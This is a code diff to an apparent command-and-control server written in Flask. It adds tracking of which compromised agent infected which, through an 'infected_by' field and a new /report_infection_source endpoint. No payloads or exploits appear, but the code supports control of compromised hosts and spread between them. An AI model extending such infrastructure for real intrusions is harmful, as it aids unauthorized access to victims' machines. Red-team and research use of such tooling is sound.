@@ -97,7 +97,7 @@ def beacon():
         # Validate all required fields are present and not None
         if all(json_data.get(field) not in (None, "", []) for field in required_fields):
             print(f"New agent: {paw}")
-            agents[paw] = {"paw": paw, "info": data}
+            agents[paw] = {"paw": paw, "info": data, "infected_by": None}
         else:
             print(
                 f"[ERROR] Agent {paw} missing required fields, not adding: "
@@ -147,6 +147,7 @@ def get_agents():
                 "privilege": parsed_info.get("privilege"),
                 "pid": parsed_info.get("pid"),
                 "host_ip_addrs": parsed_info.get("host_ip_addrs"),
+                "infected_by": data.get("infected_by"),
             }
         except (binascii.Error, UnicodeDecodeError) as exc:
             raise ValueError(f"Invalid base64 data: {exc!r}")
@@ -154,6 +155,37 @@ def get_agents():
             raise ValueError(f"Malformed JSON: {exc!r}")
 
     return jsonify(agents_list)
+
+
+# Report infection source
+@app.route("/report_infection_source", methods=["POST"])
+def report_infection_source():
+    try:
+        data = request.data
+        json_data = json.loads(data)
+
+        source_agent_paw = json_data.get("source_agent")
+        new_agent_paw = json_data.get("new_agent")
+
+        if not source_agent_paw or not new_agent_paw:
+            return jsonify({"error": "Missing source or target paw"}), 400
+
+        if source_agent_paw not in agents or new_agent_paw not in agents:
+            return jsonify({"error": "Source or target agent not found"}), 404
+
+        agents[new_agent_paw]["infected_by"] = source_agent_paw
+
+        # Here you would typically log the infection event or update the state
+        print(f"[DEBUG] Reporting infection from {source_agent_paw} to {new_agent_paw}")
+
+        return jsonify(
+            {"status": "success", "message": "Infection source reported"}
+        ), 200
+
+    except json.JSONDecodeError:
+        return jsonify({"error": "Invalid JSON data"}), 400
+    except Exception as e:
+        return jsonify({"error": f"Internal server error: {str(e)}"}), 500
 
 
 # Send command to a specific agent
